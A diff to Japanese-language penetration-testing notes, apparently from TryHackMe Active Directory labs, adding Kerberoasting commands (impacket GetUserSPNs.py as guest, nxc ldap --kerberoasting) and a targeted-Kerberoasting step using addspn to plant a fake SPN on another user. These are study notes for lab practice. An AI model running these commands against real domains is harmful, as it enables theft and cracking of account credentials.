@@ -100,6 +100,31 @@ python3 /home/kali/tools/impacket/examples/GetUserSPNs.py controller.local/Machi
 
 Rubeus 同様に hashcat でクラック。
 
+guest。パスワード入力でそのままEnterを押す。
+
+```sh
+GetUserSPNs.py thm.local/guest@$TARGET -dc-ip $TARGET -request
+```
+
+### nxc
+
+```sh
+nxc ldap ad.thm.local -u 'guest' -p '' --kerberoasting kerberoastables.txt
+```
+
+## 標的型Kerberoasting
+
+KerberoastingはSPNを持つユーザーをターゲットにするが、あるユーザーがほかのユーザーに対してGenericWrite権限（WriteProperties）を持っているとき、そのユーザーにSPNを追加した後にKerberoastingを実行する攻撃がある。
+
+```sh
+# kali の場合、addspn を実行すると必要なソフトをインストールできる
+addspn -u 'thm.local\ZACHARY_HUNT' -p '[REDACTED]' \
+-d thm.local \
+--target 'JERRI_LANCASTER' \
+--spn fake/http \
+$TARGET
+```
+
 ## AS-REP Roasting
 
 サービスアカウント以外のユーザーのハッシュも入手できることが利点。  
